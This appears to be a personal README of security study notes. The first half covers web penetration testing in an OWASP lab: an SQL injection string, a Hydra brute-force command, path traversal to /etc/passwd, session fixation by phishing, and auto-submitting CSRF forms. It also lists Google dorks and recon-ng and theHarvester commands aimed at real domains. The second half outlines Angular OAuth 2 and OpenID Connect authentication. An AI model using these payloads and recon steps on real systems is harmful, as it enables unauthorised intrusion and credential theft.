<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**  *generated with [DocToc](https://github.com/thlorenz/doctoc)*

- [Haking Web Apps and Penetration Testing (in short)](#haking-web-apps-and-penetration-testing-in-short)
  - [Haking Web Apps and Penetration Testing - Tools & Configs](#haking-web-apps-and-penetration-testing---tools--configs)
  - [Inputs and Outputs testing](#inputs-and-outputs-testing)
  - [Authentication vulnerabilities testing](#authentication-vulnerabilities-testing)
  - [Authorization vulnerabilies testing](#authorization-vulnerabilies-testing)
  - [Session management flaws - Session Fixation](#session-management-flaws---session-fixation)
  - [Session management flaws - Cross Site Request Forgery](#session-management-flaws---cross-site-request-forgery)
  - [Information Gathering Through the Internet](#information-gathering-through-the-internet)
    - [Google Hacking: Looking for Sensitive Pages](#google-hacking-looking-for-sensitive-pages)
    - [Google Hacking Database - crawls WWW](#google-hacking-database---crawls-www)
    - [Shodan - crawls Internet](#shodan---crawls-internet)
    - [pipl.com, checkusernames.com - gather info about people](#piplcom-checkusernamescom---gather-info-about-people)
    - [Web Archives](#web-archives)
    - [FOCA -  Fingerprinting Organization with Collected Archives](#foca----fingerprinting-organization-with-collected-archives)
    - [The Harvester and Recon-NG](#the-harvester-and-recon-ng)
    - [Maltego - Visual Link Analizes Tool](#maltego---visual-link-analizes-tool)
- [Securing Angular Apps with OpenID Connect and OAuth 2](#securing-angular-apps-with-openid-connect-and-oauth-2)
  - [Angular App Security Big Picture](#angular-app-security-big-picture)
  - [Authenticating with OpenID Connect](#authenticating-with-openid-connect)
  - [Connecting to a Different OpenID Connect Provider](#connecting-to-a-different-openid-connect-provider)
  - [Authorizing Calls to Your Backend APIs with OAuth 2](#authorizing-calls-to-your-backend-apis-with-oauth-2)
  - [Enhancing the Security User Experience](#enhancing-the-security-user-experience)
- [Security Architecture Using Claims](#security-architecture-using-claims)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

Security Projects - coverded subjects:

#  Haking Web Apps and Penetration Testing (in short)

## Haking Web Apps and Penetration Testing - Tools & Configs
- Install Virtual Box and Vagrant. Connect all your Virtual Machines in a NAT network.
- Install Kali. 
- Install Foxy Proxy in the browser and use it to rapidly change the Proxy for your browser traffic each time you perform penetration tests 

In terminal:
Each time you take action to trouble shoot issues (eg. Manually set the IP for your VM) you have to reboot your virtual machine.
```bash
ip a # OR:
ifconfig # to see your IP
ping 8.8.8.8 # ping your DNS address
IP Address = Gateway IP 
service networking restart
service networking status
```

- choose Proxy 'localhost:8080' in order to route traffic through Burp Suite
- Use Burt Suite - run it by turning on interseption
- Use OWASP ZAP – can use it as  apersonal proxy = find vulnerabilities in web app

```bash 
Chmod 755 ZAP_unix.sh
./ ZAP_unix.sh  # install on linux VM
``` 
- Use BeEF = Browser Explotaition Framework
- Use OWASP's Broken Web Applications located in souceforge.org in oder to install it on your local machines and make penetration testing

## Inputs and Outputs testing
- If the input is not sanitized, an SQL injection can be done sending the input field like:

- Use SQL Map app (is embeded into Kali Linux), to exploit+test SQL vulnerabilities 

![SQL-MAP-test](./SQL-MAP-test.JPG)

``1' OR 1=1 -- `` Which compleates a valid SQL in the database interogation process:

- A good fix for SQL injection is the use of ORM ( in OO languages). On front-end side Frameworks sanitize form inputs.

- In the case of brute force attacks, the amount of time to guess the password encresease exponentialy with the length of the password. Advise for personal password: 
choose long passwords - eg. 40-60 characters - for all your accounts, just have for each account a specific word - different from an account to another.

## Authentication vulnerabilities testing
- Use HYDRA( embeded in Kali) - Online App Password Cracking Tool:
![authentication-crack-with-HYDRA](./authentication-crack-with-HYDRA.JPG)

- choose Proxy 'localhost:8080' in order to route browser's traffic through Burp Suite
- make a login attempt and Burp intersepts this loging attenpt. Use Burp's data in order
crack the passwords with Hydra:

![burp-suite-interception](./burp-suite-interception.JPG)

```Bash
# as root@kali :

hydra -l admin -P /usr/share/john/password/lst 172.16.99.139 http-post-form "/dvwa/login.php:username=^USER^&password=^^PASS^&Login=Login:Login failed" -f
# where the 'Login failed' is the message from UI interface
# the -f flag denotes that command should exit when it find a valid pair user-pass
```
## Authorization vulnerabilies testing

- One Authorization vulnerability is the path traversal vulnerability ( server level we can change path and have direct access at files from server)

For example, in the URL of the website to hack,you can end the path with: `../../../../../../etc/passwd` (for a Linux based OS - for Windows we have ..\), where the use of ../ will be as high as needed to rich the root path(if there are too many occurences of `../` there will be no error). Thus you got into the passwords directory. Worst, if we can reach the shadow file, we get access to the file with actual passwords in encrypted format.

## Session management flaws - Session Fixation

Session ID should change after user login, orelse - Session fixation vulnerability can be exploited:

![session-fixation-vulnerability](./session-fixation-vulnerability.JPG)

To test this vulnerability, in the OWASP's Broken Web Applications installed on your Kali machine, click OWASP WebGoat link. Authenticate and go to session fixation vulnerability. Send a phising email containig  a madeup session id (that you - the attacker will use after the victim has logged in with your made-up session id and it's credentials) inside a legitim URL that points to the trusted app for the user. Follow all steps, guided by the OWOASP WebGoat interface, in order to explore how penetration test is done.

## Session management flaws - Cross Site Request Forgery

Once again you can test this vulnerability on the OWASP's Broken Web Applications installed on your Kali machine:

1. Click the CSRF button and after that copy from page source the  change pass form, into a page of yours.

```HTML
<h3>Just click the button</h3>
<form action="http://owaspbwa.com/dvwa/vulnerabilities/csrf" method="GET"> <!-- explicitly change the action URL of the GET method with the one of the page where the form exists-->
<input type="hidden" name="password_new" value="111"> <!-- hide the pass input for the victim -->
<input type="hidden" name="password_conf" value="111"> <!-- hide the new pass input for the victim -->
<input type="submit" value="Change" name="Change">
</form>
```
While the user is logged in the app (or you, testing this vulnerability), if he clicks Change button in the page that loads this script(the one provided by an attacker who knows the CSFR vulnerability), his password will be changed.

even more, the HTML change with some JavaScript doesn't even require the user to click:

```HTML
<h3>No need to click - no button</h3>
<form action="http://owaspbwa.com/dvwa/vulnerabilities/csrf"  method="GET" name="myForm" id="myForm"> <!-- explicitly change the action URL of the GET method with the one of the page where the form exists-->
<input type="hidden" name="password_new" value="111"> <!-- hide the pass input for the victim -->
<input type="hidden" name="password_conf" value="111"> <!-- hide the new pass input for the victim -->
<input type="hidden" value="Change" name="Change"> <!-- hide the button for the victim, the script will submit the form -->
</form>
<script>
document.forms["myForm"].submit();
</script>
```

## Information Gathering Through the Internet

### Google Hacking: Looking for Sensitive Pages

- ``inurl:co.uk inurl:admin`` #use this in Google search in order to find administrator panels in sites that have .co.uk superdomain
- ``filetype:sql hotmail gmail password``
- ``site:/com:8443``
- ``intitle:index.of``

### Google Hacking Database - crawls WWW

[https://www.exploit-db.com/google-hacking-database](https://www.exploit-db.com/google-hacking-database) 

The Google Hacking Database (GHDB) is an authoritative source for querying the ever-widening reach of the Google search engine. In the GHDB you'll find search terms for files containing usernames, vulnerable servers, and even files containing passwords.

When the Google hacking database was integrated in the exploit database of offensive security, the various Google talks contained in the thousands of exploit entries, were entered into the GHDB. The direct mapping allows penetration testers to more rapidly determine if a particular web application has a publicly available exploit.

### Shodan - crawls Internet

Shodan - crawls Internet [https://ics-radar.shodan.io/](https://ics-radar.shodan.io/) and finds all devices connectected to the internet. 
Go to: www.shodan.io page. Search example: ``cisco last-modified country:GB`` . In the seach result you will get access to CISCO interfaces where you(the attacker) can perform Brute Force Attacks - or even worst (for the victim), get access to a CISCO device manager interface :-|.

### pipl.com, checkusernames.com - gather info about people

pipl.com - gather info that other search engines miss about people.
checkusernames.com - searches inside 160 networks for an user name

### Web Archives

Web Archives - [http://web.archive.org](http://web.archive.org) - stores pages that do not exist anymore on publicly available websites. Search for the website you are interested in and you will be provided with links(inside a timetable) to the archived website(that can contain sensitive data, not disclosed any more on the website).


### FOCA -  Fingerprinting Organization with Collected Archives

FOCA -  Fingerprinting Organization with Collected Archives - a tool used mainly to find metadata and hidden information.

a) You can download all the sources as well as the executable binary from github.com/ElevenPaths/FOCA (requires SQL Express installed on your machine)
OR
b) use an older version, portable - no installation - from elevenpaths.com's website (in the bottom of the page):
Run FOCA.exe from bin dir -> New Project in wich correcty provide the website domain you what to scan and colect documents/metadata from. After scan you will have the result list with documents, see metadata of each document (select documents and download) .

### The Harvester and Recon-NG

The Harvester ( available at githib.com/laramies/theHarvester and also embeded in Kali Linux) = a tool to gather emails, hosts, ports, etc ... from a domain

```bash
theharvester options # see options
theharvester -d etu.edu.tr -l 2000 -b bing # domain etu.edu ..., limit 2000, data source=bing
# when it finishes the search you will see the emails, hosts found as search results
```
Recon-NG - embeded in Kali Linux or you can download it from bitbucket.org

Recon-ng is a full-featured Web Based Open Source Reconnaissance framework written in Python. Complete with independent modules,

database interaction, built in convenience functions, interactive help, and command completion.

```bash
./recon-ng.py # written in Phyton
recon-ng # run script and you will get a shell like interface
help
show modules # see available modules
use recon/domains-vulnerabilities/xssed
show info # will display info about the recon/domains-vulnerabilities/xssed module
show options # see module's params
set SOURCE www.nhs.uk # set the source in wich to recognize a xssed vulnerability
run # run module = search for vulnerabilities
```
### Maltego - Visual Link Analizes Tool
Maltega Website: www.paterva.com

```bash
maltegoce # run Maltego Community edition  embeded

```
- Choose the machine to run
- specify target domain
- 12 entries of data colected for this domain show in the result page
- select grouped nodes from the graphic results and you will see all the values (eg. emails for those nodes)

# [Securing Angular Apps with OpenID Connect and OAuth 2](#securing-angular-apps-with-openid-connect-and-oauth-2)
- [MSAL2 in Angular10 Implementation](./msal2-angular10/README.md)

## Authorization Code Flow Demo with Http VScode

[https://www.youtube.com/watch?v=ly5dxX5z_ok&list=PLhOe7XHlsIfFXCnP7_4pDGlcyJ5l3GUqY&index=9](https://www.youtube.com/watch?v=ly5dxX5z_ok&list=PLhOe7XHlsIfFXCnP7_4pDGlcyJ5l3GUqY&index=9)

[Code in dir ./Autentication-Flows-Http\get.http](./Autentication-Flows-Http\get.http)
Install REST Client Extention in orger to make GET?POST API request without the need of Postman
In VS Code -> View -> Toggle Wordwrapp

This basicaly includes authenticating with IDToken and after that getting the authorization token(accessToken) to auth in B2C. For dev pursoses we use localhost but the RedirectURI should be of https
get1.http:

```js
GET https://login.microsoftofline.com/organizations/oauth2/v2.0/authorize?client_id=andHeareIsTheValueFromAzureActiveDirectory..
&response_type=code
&redirect_uri=http://localhost
&response_mode=query
&scope=https://graph.microsoft.com/user.read
```
instead of /organizations/ can be /common/ or the tenant id that you can find in portal.azure.com -> your registered app config

If we Run GET request in VS Code, will get a 200 OK and the HTML page of the MS sign-in
Thus, if you put that curl in browser and you land on MS login page, where if you consent and login you get redirected to the localhost, with a query string like ?code= 0.AAGGGFSGHH....&session_state=hhdgjg-gfgs...):

```js
http://localhost/?code=theCodeThatIReceivedInTheQuesryParamsOfTheRedirectURL&session_state=hhdgjg-gfgs...
```
This code we can use when we go get our token:

```js
POST https://login.microsoftonline.com/organizations/oauth2/v2.0/token
Content-Type: application/x-www-form-urlencoded

client_id=andHeareIsTheValueFromAzureActiveDirectory
&redirect_uri=http://localhost
&scope=https://graph.microsoft.com/user.read
&grant_type=authorization_code
&code=theCodeThatIReceivedInTheQuesryParamsOfTheRedirectURL
```
If I run this POST I get the Bearer Token that I can further use to access the diferent APIs `theBearerTokenthatIcanfurtherusetoaccessdiferentAPIs`
In [aka.ms/ge](https://aka.ms/ge) it opens https://developer.microsoft.com/en-us/graph/graph-explorer

To get profile photo use: https://graph.microsoft.com/v1.0/me/photo/$value API
```js
GET https://graph.microsoft.com/v1.0/me/photo/$value
Authorization: Bearer theBearerTokenthatIcanfurtherusetoaccessdiferentAPIs
```
OAuth 2.0 Authorization code flow (with PKCE). The authorization code flow allows the application to exchange an authorization code for ID tokens to represent the authenticated user and Access tokens needed to call protected APIs. In addition, it returns Refresh tokens that provide long-term access to resources on behalf of users without requiring interaction with those users. This is the recommended approach.

[https://docs.microsoft.com/en-us/azure/active-directory/develop/authentication-flows-app-scenarios](https://docs.microsoft.com/en-us/azure/active-directory/develop/authentication-flows-app-scenarios)

[More Secure JavaScript Single-Page Applications with MSAL 2.0 and OAuth 2.0 Auth Code Flow with PKCE](https://www.youtube.com/watch?v=YxAwGAnmNqQ)

## [Angular App Security Big Picture](#angular-app-security-big-picture)
You can follow MS Azure Active Directory docs, videos and posts about configuring your app registrations. You will find details about all the above.

[How to authenticate users of your app with MS identity platform](https://www.youtube.com/watch?v=Mtpx_lpfRLs&list=PLhOe7XHlsIfFXCnP7_4pDGlcyJ5l3GUqY&index=6)

- [Security Design Considerations](#security-design-considerations)
- [Client vs. Server Security](#client-vs-server-security)
- [Angular App Security Architecture](#angular-app-security-architecture)
- [Authentication and Authorization](#authentication-and-authorization)
- [Terminology](#terminology)
- [OpenID Connect and OAuth 2 Protocols](#openid-connect-and-oauth-2-protocols)
- [Identity Provider Options](#identity-provider-options)
- [Client Library Options](#client-library-options)
- [A Tour through the Demo Application](#a-tour-through-the-demo-application)
## [Authenticating with OpenID Connect](#authenticating-with-openid-connect)
- [Choosing OpenID Connect](#choosing-openid-connect)
- [Understanding OpenID Connect JWT Tokens](#understanding-openid-connect-jwt-tokens)
- [Choosing Your OpenID Connect Protocol Flow](#choosing-your-openid-connect-protocol-flow)
- [Using Authorization Code Flow with PKCE](#using-authorization-code-flow-with-pkce)
- [A Word About OIDC-client Library](#a-word-about-oidc-client-library)
- [A Quick Review of the Client Functionality](#a-quick-review-of-the-client-functionality)
- [Getting the Client Code Running on Your Machine](#getting-the-client-code-running-on-your-machine)
- [Getting the Server-side Code Running on Your Machine](#getting-the-server-side-code-running-on-your-machine)
- [Adding oidc-client and an Auth Service Component](#adding-oidc-client-and-an-auth-service-component)
- [Configuring oidc-client to Connect to Your STS](#configuring-oidc-client-to-connect-to-your-sts)
- [Adding Login to the App](#adding-login-to-the-app)
- [Logging into the STS](#logging-into-the-sts)
- [Adding the Post-login Callback Page](#adding-the-post-login-callback-page)
- [Handling Login Status and Logging Out](#handling-login-status-and-logging-out)
- [Debugging Client Configuration Errors](#debugging-client-configuration-errors)
- [Inspecting the JWT Tokens](#inspecting-the-jwt-tokens)
- [A Word About User Registration](#a-word-about-user-registration)
## [Connecting to a Different OpenID Connect Provider](#connecting-to-a-different-openid-connect-provider)
- [Integrating with Other OIDC Providers](#integrating-with-other-oidc-providers)
- [Configuring Client Apps, APIs, and Users in Auth0](#configuring-client-apps-apis-and-users-in-auth0)
- [Changing the Client Configuration to Connect with Auth0](#changing-the-client-configuration-to-connect-with-auth0)
- [Resolving Differences in STS Configuration](#resolving-differences-in-sts-configuration)
- [Summary](#summary)
## [Authorizing Calls to Your Backend APIs with OAuth 2](#authorizing-calls-to-your-backend-apis-with-oauth-2)
- [OAuth 2 Terminology/Roles](#oauth-2-terminologyroles)
- [OAuth 2 Grant Types](#oauth-2-grant-types)
- [Understanding OAuth 2 Tokens](#understanding-oauth-2-tokens)
- [Requiring Consent](#requiring-consent)
- [Requiring Authentication at the API Server](#requiring-authentication-at-the-api-server)
- [Passing Access Tokens in API Calls Manually](#passing-access-tokens-in-api-calls-manually)
- [Using an Authentication Interceptor to Pass Tokens](#using-an-authentication-interceptor-to-pass-tokens)
- [Filtering Data Based on Claims](#filtering-data-based-on-claims)
- [Enforcing Access Control Based on Claims](#enforcing-access-control-based-on-claims)
- [Handling Authorization Errors in the Client App](#handling-authorization-errors-in-the-client-app)
- [Using Role or Custom Claims for Filtering and Access Control](#using-role-or-custom-claims-for-filtering-and-access-control)
- [Summary](#summary-1)
## [Enhancing the Security User Experience](#enhancing-the-security-user-experience)
- [Revisiting Token Management](#revisiting-token-management)
- [Token Expiration Review](#token-expiration-review)
- [Enabling Silent Renew of Access Tokens](#enabling-silent-renew-of-access-tokens)
- [Providing a Security Context to the Client](#providing-a-security-context-to-the-client)
- [Managing User Experience Based on the Security Context](#managing-user-experience-based-on-the-security-context)
- [Preventing Unauthorized Access to Views with Route Guards](#preventing-unauthorized-access-to-views-with-route-guards)
- [Single Sign-on from Another Client App](#single-sign-on-from-another-client-app)
- [Summary](#summary-2)

# Security Architecture Using Claims

![angular-security-using-claims](./angular-security-using-claims.JPG)